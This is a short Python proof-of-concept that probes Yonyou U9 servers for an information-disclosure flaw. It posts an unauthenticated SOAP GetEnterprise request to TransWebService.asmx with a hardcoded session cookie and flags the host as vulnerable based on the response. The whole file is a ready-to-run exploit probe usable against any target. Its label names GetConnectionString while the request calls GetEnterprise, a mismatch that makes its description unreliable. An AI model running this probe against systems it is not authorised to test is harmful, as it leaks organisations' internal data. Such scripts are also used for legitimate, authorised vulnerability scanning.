import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友u9系统接口GetConnectionString存在信息泄露漏洞',
        'vulnerable': False,
        'url': url
    }
    headers1 = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'close',
        'Cookie': '.ASPXANONYMOUS=1trTf5ff2gEkAAAAMzU0N2I3ZjctYzg0OC00YWFmLTliZTEtNDI2NDc1YmYyMTc10; ASP.NET_SessionId=ntvjalpizrae22kebxy5tn0g',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=1',
        'SOAPAction': 'http://tempuri.org/GetEnterprise',
        'Content-Type': 'text/xml;charset=UTF-8'
    }
    data1 = '''<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
       <soap:Header/>
       <soap:Body>
          <tem:GetEnterprise/>
       </soap:Body>
    </soap:Envelope>'''
    vurl = urllib.parse.urljoin(url, "/CS/Office/TransWebService.asmx")
    try:
        response = requests.post(vurl, headers=headers1, data=data1)
        if response.status_code == 200 and 'Code' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult